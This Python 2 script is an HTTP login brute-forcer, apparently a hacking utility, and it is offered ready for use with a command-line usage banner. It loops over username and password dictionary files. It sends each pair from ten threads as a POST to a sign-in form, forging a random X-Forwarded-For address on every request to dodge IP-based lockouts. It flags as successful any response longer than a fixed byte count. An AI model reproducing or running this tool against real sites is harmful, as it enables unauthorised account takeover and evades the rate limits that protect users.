#!/usr/bin/env python
# -*- coding: utf-8 -*-

'''
HTTP bruteforcer

Author: p0wd3r
'''

import sys
import time
import random
import Queue
import threading
import requests


class BruteForcer(object):
    def __init__(self, url, dict_user, dict_pwd):
        self.url = url
        self.mutex = threading.Lock()
        self.q = Queue.Queue()
        self._load_keys(dict_user, dict_pwd)

    def _load_keys(self, dict_user, dict_pwd):
        """put the keys from file into the queue"""
        try:
            f_user = open(dict_user, 'r')
            f_pwd = open(dict_pwd, 'r')
        except IOError:
            exit('No such files')
        for user in f_user:
            f_pwd.seek(0)
            for pwd in f_pwd:
                key = '%s:%s' % (user.strip(), pwd.strip())
                self.q.put(key)

    def _bruteforce(self):
        """make bruteforce"""
        while not self.q.empty():
            key = self.q.get()
            user = key.split(':')[0]
            pwd = key.split(':')[1]

            headers = {
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 \
                                (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36',
                'X-Forwarded-For': '.'.join([str(random.randint(0, 255)) for _ in range(4)])
            }
            data = {
                'name': user,
                'password': pwd,
                'enter': 'Sign in'
            }
            html = requests.post(self.url, headers=headers, data=data).content
            print len(html)
            if len(html) > 3845:
                with self.mutex:
                    print '[+] Success: %s:%s' % (user, pwd)

    def run(self):
        """index"""
        threads_brute = [threading.Thread(target=self._bruteforce) for _ in range(10)]
        for t in threads_brute:
            t.setDaemon(True)
            t.start()

        while threading.activeCount() > 1:
            try:
                time.sleep(1)
            except KeyboardInterrupt:
                exit('\n[-] User aborted')


if __name__ == '__main__':
    if len(sys.argv) != 4:
        print 'Usage: python http_bruteforcer.py url dict_user dict_pwd'
        print 'Please change the data and the length first!'
    else:
        url = sys.argv[1]
        dict_user = sys.argv[2]
        dict_pwd = sys.argv[3]
        b = BruteForcer(url, dict_user, dict_pwd)
        b.run()
